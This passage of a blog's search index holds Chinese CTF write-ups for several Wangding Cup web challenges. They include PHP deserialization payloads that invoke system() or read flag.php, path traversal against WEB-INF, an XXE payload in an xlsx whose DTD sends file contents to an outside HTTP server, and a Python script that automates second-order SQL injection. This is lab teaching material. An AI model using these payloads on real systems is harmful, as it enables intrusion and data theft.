&quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); 这里那么多函数被禁了，主要还是禁了system比较难受，但是问题不大，毕竟没有禁file_get_contents、cat以及serialize。 这里serialize才是重点（敲黑板！），毕竟源码里给我们提供了一个Test类： 123456789class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }} 然后简单明了构造payload: 1234567891011121314151617181920&lt;?php class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $a = new Test(); // $a-&gt;p = 'ls ../../../'; ==&gt; O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:12:&quot;ls ../../../&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} // $a -&gt; p = &quot;find / -name 'flag*'&quot;; ⇒ O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:20:&quot;find / -name 'flag*'&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} $a -&gt; p = 'cat /tmp/flagoefiu4r93'; // ==&gt; O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} $a -&gt; func = 'system'; echo (serialize($a)); ?&gt;","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84--phpweb/"},{"title":"","text":"网鼎杯 2020 青龙组–AreUSerialz 题目给了源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); } } function is_valid($s) { for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } 分析一下GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间，然后对其反序列化在反序列化的过程中，调用__destruct析构方法 1234567function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); } 如果op===&quot;2&quot; ，将其赋为”1”，同时content赋为空，进入process函数，需要注意到的地方是，这里op与”2”比较的时候是强类型比较 12345678910public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); }} 进入process函数后，如果op==&quot;1&quot; 那么进入write函数，若op==&quot;2&quot; ,则进入write函数，否则输出报错，可以看出来这里op与字符串的比较变成了若比较类型==所以我们之哦呀哦令op==2 ,这里2是整数int.当op=2时,op===&quot;2&quot; 为flaseop==&quot;2&quot; 为true,接着进入read函数 1234567private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res;} filename是我们可以控制的，接着使用file_get_contents函数读取文件，我们此处借助php://filter伪协议读取文件，获取到文件后使用output函数输出 1234private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s;} 整个利用思路就很明显了，还有一个需要注意的地方是，filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?php class FileHandler { protected $op=2; protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;; protected $content; function __construct() { $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; // $this-&gt;process(); } public function process() { if($this-&gt;op == &quot;1&quot;) { $this-&gt;write(); } else if($this-&gt;op == &quot;2&quot;) { $res = $this-&gt;read(); $this-&gt;output($res); } else { $this-&gt;output(&quot;Bad Hacker!&quot;); } } private function write() { if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) { if(strlen((string)$this-&gt;content) &gt; 100) { $this-&gt;output(&quot;Too long!&quot;); die(); } $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); } else { $this-&gt;output(&quot;Failed!&quot;); } } private function read() { $res = &quot;&quot;; if(isset($this-&gt;filename)) { $res = file_get_contents($this-&gt;filename); } return $res; } private function output($s) { echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; } function __destruct() { if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; // $this-&gt;process(); } } $A=new FileHandler(); $B=serialize($A); echo $B; 输出 在这里有几种绕过的方式，简单的一种是：php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可 即: 123public $op=2;public $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;public $content; 现在得到的结果就没有%00字符了 1O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;} 得到payload 1http://82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;}","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--AreUSerialz/"},{"title":"","text":"网鼎杯 2020 青龙组–filejava 先上传随便一个文件，点下载抓包 看到?file 看到有一个路径，里面有WEB-INF，题目提示与java有关，那应该是web.xml文件泄露，尝试读取 Java Web目录结构 WEB-INF/web.xml：核心配置文件，映射Servlet类路径。WEB-INF/classes/：存放编译后的Java类文件。利用路径穿越（../../）可读取敏感文件。XXE漏洞原理 XML解析器未禁用外部实体时，可通过file://协议读取本地文件，或通过HTTP请求外带数据（Blind XXE）。Apache POI 3.10版本默认未禁用外部实体，导致漏洞。Excel文件结构 XLSX为ZIP压缩包，内含XML文件，修改[Content_Types].xml可注入恶意实体。漏洞利用链设计 文件上传 → 触发XXE → 外带数据 → 获取Flag。 1DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml 1DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class 下载下来一个class文件反编译一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124package cn.abc.servlet; import java.io.File; import java.io.FileInputStream; import java.io.IOException; import java.net.URLEncoder; import javax.servlet.ServletException; import javax.servlet.ServletOutputStream; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; /* loaded from: _.._.._.._.._.._.._.._.._usr_local_tomcat_webapps_ROOT_WEB-INF_classes_cn_abc_servlet_DownloadServlet.class */ public class DownloadServlet extends HttpServlet { private static final long serialVersionUID = 1; protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request, response); } protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { String fileName = new String(request.getParameter(&quot;filename&quot;).getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;); System.out.println(&quot;filename=&quot; + fileName); if (fileName != null &amp;&amp; fileName.toLowerCase().contains(&quot;flag&quot;)) { request.setAttribute(&quot;message&quot;, &quot;禁止读取&quot;); request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response); return; } String fileSaveRootPath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;); String path = findFileSavePathByFileName(fileName, fileSaveRootPath); File file = new File(path + &quot;/&quot; + fileName); if (!file.exists()) { request.setAttribute(&quot;message&quot;, &quot;您要下载的资源已被删除!&quot;); request.getRequestDispatcher(&quot;/message.jsp&quot;).forward(request, response); return; } String realname = fileName.substring(fileName.indexOf(&quot;_&quot;) + 1); response.setHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + URLEncoder.encode(realname, &quot;UTF-8&quot;)); FileInputStream in = new FileInputStream(path + &quot;/&quot; + fileName); ServletOutputStream out = response.getOutputStream(); byte[] buffer = new byte[1024]; while (true) { int len = in.read(buffer); if (len &gt; 0) { out.write(buffer, 0, len); } else { in.close(); out.close(); return; } } } public String findFileSavePathByFileName(String filename, String saveRootPath) { int hashCode = filename.hashCode(); int dir1 = hashCode &amp; 15; int dir2 = (hashCode &amp; 240) &gt;&gt; 4; String dir = saveRootPath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2; File file = new File(dir); if (!file.exists()) { file.mkdirs(); } return dir; } } 1zip -r ./payload.xlsx ./excel-123456 1234python -m SimpleHTTPServer 4560netstat -tulnp | grep 4560kill pid evil.dtd 1&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://10.88.15.58:4560/%file;'&gt;&quot;&gt; 是服务器nc的端口 启动http服务在xlsx文件的 1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://10.88.15.58:4560/evil.dtd&quot;&gt;%remote;%int;%send;]&gt; 1234python -m SimpleHTTPServer 4560python -m http.server 4560","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84--filejava/"},{"title":"","text":"网鼎杯2018–Unfinish 先登录看一下 随便注册一个 发现再登录成功后用户名会回显我们这里先扫一遍看一眼 发现是存在sql盲注的题目提示SQL，在注册页面测试无果，且发现输入框限制了特殊字符，要用BurpSuite提交payload。username=alice’ and left(database(),1)&gt;’a’# 发现被过滤了得到nono这里我们去fuzz测试一下发现information和逗号，盲注可能不太行了经过尝试，构造username=select database()，登录后显示用户名还是为select database()，说明后台代码可能把username用单引号引起来了，导致其无法显示。 10’+ascii(substr(database() from 1 for 1))+’0; 1email=test2%40qq.com&amp;username=0'%2B(select hex(hex(database())))%2B'0&amp;password=123456 HEX转bytes373736353632-》776562-》web 12345678910111213141516171819202122232425262728293031323334import requests import logging import re from time import sleep # LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot; # logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT) def search(): flag = '' url = 'http://b52b0533-2f84-4c9b-bd73-e912ab23a59f.node3.buuoj.cn/' url1 = url+'register.php' url2 = url+'login.php' for i in range(100): sleep(0.3)#不加sleep就429了 #先初始化注册一个账号，不重复的用i，这个是注入语句&quot;0'+ascii(substr((select * from flag) from {} for 1))+'0;&quot;.format(i) data1 = {&quot;email&quot; : &quot;1234{}@123.com&quot;.format(i), &quot;username&quot; : &quot;0'+ascii(substr((select * from flag) from {} for 1))+'0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;} #登录这个账号 data2 = {&quot;email&quot; : &quot;1234{}@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;} #发送请求获得响应 r1 = requests.post(url1, data=data1) #发送请求获得响应 r2 = requests.post(url2, data=data2) #查找那个回显的地方 \\s*(\\d*)\\s* 匹配「前后带任意空白的数字」 res = re.search(r'&lt;span class=&quot;user-name&quot;&gt;\\s*(\\d*)\\s*&lt;/span&gt;',r2.text) #提取纯数字（过滤可能的空格） res1 = re.search(r'\\d+', res.group()) #拼接flag flag = flag+chr(int(res1.group())) print(flag) print(&quot;final:&quot;+flag) if __name__ == '__main__': search()","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2018--Unfinish/"}],"tags":[],"categories":[],"pages":[{"title":"","text":"google-site-verification: google0ce01516f2d5551f.html","link":"/static/google0ce01516f2d5551f.html"}]}